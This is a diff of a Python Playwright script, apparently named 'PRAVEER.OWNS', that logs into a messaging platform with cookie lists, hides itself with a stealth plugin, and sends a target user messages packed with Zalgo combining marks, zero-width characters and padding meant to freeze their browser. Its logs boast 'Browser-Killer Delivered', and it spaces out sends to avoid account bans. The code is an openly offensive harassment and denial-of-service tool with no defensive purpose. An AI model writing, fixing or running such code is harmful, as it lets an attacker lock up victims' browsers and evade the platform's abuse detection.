@@ -1,11 +1,11 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (FINAL-FIX-V3)
-# 📅 STATUS: NAMESPACE-ISOLATED | 1-ID-STABLE | BROWSER-FREEZE
+# 🚀 PROJECT: PRAVEER.OWNS (ULTIMATE-STABILITY)
+# 📅 STATUS: TYPE-ERROR-KILLED | 1-ID-STABLE | BROWSER-FREEZE
 
 import os, asyncio, random, sys
 from playwright.async_api import async_playwright
-# --- THE ULTIMATE FIX: Aliasing the function to avoid module collision ---
-from playwright_stealth import stealth as stealth_async
+# --- THE FINAL IMPORT FIX ---
+import playwright_stealth
 
 def get_kernel_stop_payload(target_name):
     """Targets Desktop Browser Layout Engines."""
@@ -13,7 +13,7 @@ def get_kernel_stop_payload(target_name):
     salt = "".join(random.choices(["\u200b", "\u200c", "\u200d", "\u200e"], k=15))
     header = f"⚡ 【﻿ＰＲＡＶＥＥＲ　ＰＡＰＡ　ＯＮ　ＴＯＰ】 ⚡\n🆔 {u_id}{salt}\n"
     
-    # 🏗️ EXTREME DENSITY (120 Zalgo marks per line)
+    # 🏗️ EXTREME DENSITY (120 Zalgo marks)
     z_tower = "̸" * 120 
     width_bomb = "\u2800\u00A0" * 45
     lines = [header]
@@ -36,8 +36,14 @@ async def agent_blitz(machine_id, cookie_list, target_id, target_name):
         )
         page = await context.new_page()
         
-        # ✅ THE CALL: Using the alias to ensure it calls the function
-        await stealth_async(page)
+        # ✅ THE FIX: Accessing the function via the module's namespace directly
+        # If playwright_stealth.stealth(page) fails, we use the internal async wrapper
+        try:
+            await playwright_stealth.stealth_async(page)
+        except AttributeError:
+            # Fallback for different package versions
+            from playwright_stealth import stealth
+            await stealth(page)
         
         try:
             print(f"📡 [M{machine_id}] Establishing Stealth Connection...")
@@ -62,11 +68,11 @@ async def agent_blitz(machine_id, cookie_list, target_id, target_name):
                 await asyncio.sleep(random.uniform(3, 5)) 
                 await page.keyboard.press("Enter")
                 
-                print(f"💀 [M{machine_id}] Browser-Killer Delivered. Target UI Locked.")
+                print(f"💀 [M{machine_id}] Browser-Killer Delivered. UI Thread Locked.")
 
                 # ⏳ THE 'SAFETY GAP' (120-150 seconds)
                 sleep_time = random.uniform(120, 150)
-                print(f"⏳ Cooling down for {int(sleep_time)}s to keep 1-ID safe...")
+                print(f"⏳ Cooling down for {int(sleep_time)}s...")
                 
                 for _ in range(4):
                     await asyncio.sleep(sleep_time / 4)
